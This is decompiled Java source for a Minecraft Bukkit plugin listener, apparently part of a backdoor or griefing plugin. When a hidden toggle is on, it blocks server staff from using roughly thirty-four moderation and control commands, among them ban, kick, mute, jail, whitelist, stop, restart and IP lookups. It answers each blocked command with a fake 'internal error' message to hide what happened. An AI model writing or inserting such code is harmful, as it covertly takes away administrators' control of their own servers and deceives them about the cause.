/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 *  org.bukkit.event.EventHandler
 *  org.bukkit.event.Listener
 *  org.bukkit.event.player.PlayerCommandPreprocessEvent
 */
package me.qlutch.sucks.events;

import me.qlutch.sucks.Core;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;

public class NoPunishmentCommandListener
implements Listener {
    private static final Core INSTANCE = Core.getPlugin(Core.class);

    @EventHandler
    public void onCommandProcess(PlayerCommandPreprocessEvent event) {
        Player p2 = event.getPlayer();
        if (NoPunishmentCommandListener.INSTANCE.modCmd && !NoPunishmentCommandListener.INSTANCE.lite.contains(p2.getName())) {
            if (event.getMessage().toLowerCase().startsWith("/ban")) {
                event.setCancelled(true);
                p2.sendMessage("§cAn interal error has occured while attempting to execute this command.");
            }
            if (event.getMessage().toLowerCase().startsWith("/bukkit")) {
                event.setCancelled(true);
                p2.sendMessage("§cAn interal error has occured while attempting to execute this command.");
            }
            if (event.getMessage().toLowerCase().startsWith("/minecraft")) {
                event.setCancelled(true);
                p2.sendMessage("§cAn interal error has occured while attempting to execute this command.");
            }
            if (event.getMessage().toLowerCase().startsWith("/litebans")) {
                event.setCancelled(true);
                p2.sendMessage("§cAn interal error has occured while attempting to execute this command.");
            }
            if (event.getMessage().toLowerCase().startsWith("/whitelist")) {
                event.setCancelled(true);
                p2.sendMessage("§cAn interal error has occured while attempting to execute this command.");
            }
            if (event.getMessage().toLowerCase().startsWith("/wl")) {
                event.setCancelled(true);
                p2.sendMessage("§cAn interal error has occured while attempting to execute this command.");
            }
            if (event.getMessage().toLowerCase().startsWith("/eban")) {
                event.setCancelled(true);
                p2.sendMessage("§cAn interal error has occured while attempting to execute this command.");
            }
            if (event.getMessage().toLowerCase().startsWith("/banip")) {
                event.setCancelled(true);
                p2.sendMessage("§cAn interal error has occured while attempting to execute this command.");
            }
            if (event.getMessage().toLowerCase().startsWith("/ebanip")) {
                event.setCancelled(true);
                p2.sendMessage("§cAn interal error has occured while attempting to execute this command.");
            }
            if (event.getMessage().toLowerCase().startsWith("/essentials")) {
                event.setCancelled(true);
                p2.sendMessage("§cAn interal error has occured while attempting to execute this command.");
            }
            if (event.getMessage().toLowerCase().startsWith("/ipban")) {
                event.setCancelled(true);
                p2.sendMessage("§cAn interal error has occured while attempting to execute this command.");
            }
            if (event.getMessage().toLowerCase().startsWith("/kick")) {
                event.setCancelled(true);
                p2.sendMessage("§cAn interal error has occured while attempting to execute this command.");
            }
            if (event.getMessage().toLowerCase().startsWith("/ekick")) {
                event.setCancelled(true);
                p2.sendMessage("§cAn interal error has occured while attempting to execute this command.");
            }
            if (event.getMessage().toLowerCase().startsWith("/punish")) {
                event.setCancelled(true);
                p2.sendMessage("§cAn interal error has occured while attempting to execute this command.");
            }
            if (event.getMessage().toLowerCase().startsWith("/stop")) {
                event.setCancelled(true);
                p2.sendMessage("§cAn interal error has occured while attempting to execute this command.");
            }
            if (event.getMessage().toLowerCase().startsWith("/reload")) {
                event.setCancelled(true);
                p2.sendMessage("§cAn interal error has occured while attempting to execute this command.");
            }
            if (event.getMessage().toLowerCase().startsWith("/rl")) {
                event.setCancelled(true);
                p2.sendMessage("§cAn interal error has occured while attempting to execute this command.");
            }
            if (event.getMessage().toLowerCase().startsWith("/restart")) {
                event.setCancelled(true);
                p2.sendMessage("§cAn interal error has occured while attempting to execute this command.");
            }
            if (event.getMessage().toLowerCase().startsWith("/ban-ip")) {
                event.setCancelled(true);
                p2.sendMessage("§cAn interal error has occured while attempting to execute this command.");
            }
            if (event.getMessage().toLowerCase().startsWith("/mute")) {
                event.setCancelled(true);
                p2.sendMessage("§cAn interal error has occured while attempting to execute this command.");
            }
            if (event.getMessage().toLowerCase().startsWith("/emute")) {
                event.setCancelled(true);
                p2.sendMessage("§cAn interal error has occured while attempting to execute this command.");
            }
            if (event.getMessage().toLowerCase().startsWith("/kill")) {
                event.setCancelled(true);
                p2.sendMessage("§cAn interal error has occured while attempting to execute this command.");
            }
            if (event.getMessage().toLowerCase().startsWith("/ekill")) {
                event.setCancelled(true);
                p2.sendMessage("§cAn interal error has occured while attempting to execute this command.");
            }
            if (event.getMessage().toLowerCase().startsWith("/etempmute")) {
                event.setCancelled(true);
                p2.sendMessage("§cAn interal error has occured while attempting to execute this command.");
            }
            if (event.getMessage().toLowerCase().startsWith("/tempmute")) {
                event.setCancelled(true);
                p2.sendMessage("§cAn interal error has occured while attempting to execute this command.");
            }
            if (event.getMessage().toLowerCase().startsWith("/tempban")) {
                event.setCancelled(true);
                p2.sendMessage("§cAn interal error has occured while attempting to execute this command.");
            }
            if (event.getMessage().toLowerCase().startsWith("/etempban")) {
                event.setCancelled(true);
                p2.sendMessage("§cAn interal error has occured while attempting to execute this command.");
            }
            if (event.getMessage().toLowerCase().startsWith("/jail")) {
                event.setCancelled(true);
                p2.sendMessage("§cAn interal error has occured while attempting to execute this command.");
            }
            if (event.getMessage().toLowerCase().startsWith("/ejail")) {
                event.setCancelled(true);
                p2.sendMessage("§cAn interal error has occured while attempting to execute this command.");
            }
            if (event.getMessage().toLowerCase().startsWith("/aacban")) {
                event.setCancelled(true);
                p2.sendMessage("§cAn interal error has occured while attempting to execute this command.");
            }
            if (event.getMessage().toLowerCase().startsWith("/aackick")) {
                event.setCancelled(true);
                p2.sendMessage("§cAn interal error has occured while attempting to execute this command.");
            }
            if (event.getMessage().toLowerCase().startsWith("/checkip")) {
                event.setCancelled(true);
                p2.sendMessage("§cAn interal error has occured while attempting to execute this command.");
            }
            if (event.getMessage().toLowerCase().startsWith("/dupeip")) {
                event.setCancelled(true);
                p2.sendMessage("§cAn interal error has occured while attempting to execute this command.");
            }
            if (event.getMessage().toLowerCase().startsWith("/seen")) {
                event.setCancelled(true);
                p2.sendMessage("§cAn interal error has occured while attempting to execute this command.");
            }
        }
    }
}

